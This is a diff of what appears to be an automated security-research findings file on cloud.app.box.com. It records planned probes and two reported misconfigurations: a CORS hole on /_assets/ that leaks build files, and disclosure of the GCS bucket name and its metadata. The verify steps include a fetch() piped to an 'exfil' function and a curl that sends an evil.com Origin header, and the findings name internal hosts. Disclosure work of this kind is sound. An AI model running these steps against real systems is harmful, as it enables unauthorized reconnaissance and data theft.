@@ -1,6 +1,14 @@
-[LEARN] REJECTED MISCONFIG @ cloud.app.box.com/: dot-root and single-dot axes (`robots.txt/..`, `robots.txt/./robots.txt`) — emitted 2026-08-15, then 3 executor cycles (22:54/23:30/23:52) ran lists containing neither; the 22:54→23:30 diff is only an appended `upload.box.com/robots.txt/` item, and 23:52 is byte-identical to 23:30, proving the executor list is fixed and cloud.app never receives arbitrary/dot paths; executor-gated, not evidence-gated.
-[PARKED] Object-store dot-root feed (`robots.txt/..`): decides whether dot-collapse feeds the 200 root through the 206 layer; 0 executor runs across 3 fixed-list cycles — permanently gated on the executor accepting arbitrary paths.
-[PARKED] Single-dot axis (`robots.txt/./robots.txt`): same executor-gate as above; no result means no evidence to fold into the normalizer model.
-[NEXT] PROBE: GET https://cloud.app.box.com/probe_9a1b2c3d4e with UA "box-research/1.0 +(research)"; record status only — decisive whitelist-vs-default-handler test for the [45] hypothesis; 206 = 206/Range object layer answers arbitrary keys (whole-origin fronting, key-space risk), 404 = pinned-key whitelist (robots.txt/favicon.ico only).
-[NEXT] PROBE: GET https://cloud.app.box.com/ROBOTS.TXT with UA "box-research/1.0 +(research)"; record status only — case axis never probed; 206 = case-insensitive key match (canonical keys lowercased), 404 = exact-case whitelist.
-[NEXT] PROBE: GET https://cloud.app.box.com/index.html with UA "box-research/1.0 +(research)"; record status only — plausible-asset guess; 206 = key list spans real app assets, 404 = fronting limited to probe-file pairs.
+class: MISCONFIG
+asset: cloud.app.box.com/_assets/*
+confidence: 85
+reasoning: The `/_assets/` prefix proxies directly to GCS bucket `box-prod-static-assets-assets-us` with `Access-Control-Allow-Origin: *,*`. Any attacker-controlled website can use `fetch()` to read `/_assets/package.json` (3168B, leaks `gitenterprise.inside-box.net`, internal repos, build paths) and `/_assets/Makefile.js` (6117B, leaks server filesystem paths `/box/www/`, console commands, app architecture). OPTIONS preflight succeeds with `access-control-allow-methods: GET`. Root-level paths (`/robots.txt`) go through a separate CDN edge that strips CORS headers — the `/_assets/` path bypasses this.
+verify_steps: 1. From attacker origin, `fetch('https://cloud.app.box.com/_assets/package.json').then(r=>r.text()).then(t=>exfil(t))` — should return full JSON with internal Git host. 2. `curl -s -I -H "Origin: https://evil.com" https://cloud.app.box.com/_assets/robots.txt` — confirms `access-control-allow-origin: *,*`.
+impact: Any website can silently read Box's internal build configuration, Git server hostname, repository paths, and server filesystem layout. Severity: Low-Medium (info disclosure, no direct data access, but aids reconnaissance for targeted attacks against internal infrastructure).
+testability: PASSIVE
+class: MISCONFIG
+asset: cloud.app.box.com/_assets/*
+confidence: 95
+reasoning: GCS 404 errors on `/_assets/` paths expose bucket name `box-prod-static-assets-assets-us` and key prefix `resources/` in XML. Every response includes `x-gog-generation`, `x-goog-hash` (crc32c + md5), `x-guploader-uploadid`, `x-goog-storage-class: STANDARD`, `x-goog-metageneration: 38`. These reveal object versioning state, storage class, and internal GCS upload tracking.
+verify_steps: `curl -sD- https://cloud.app.box.com/_assets/nonexistent` — confirms GCS XML error with bucket name; `curl -sD- https://cloud.app.box.com/_assets/robots.txt` — confirms full metadata headers on 200.
+impact: Information disclosure. Bucket name and metadata aid attacker reconnaissance. No direct exploitation but reduces attack surface complexity.
+testability: PASSIVE
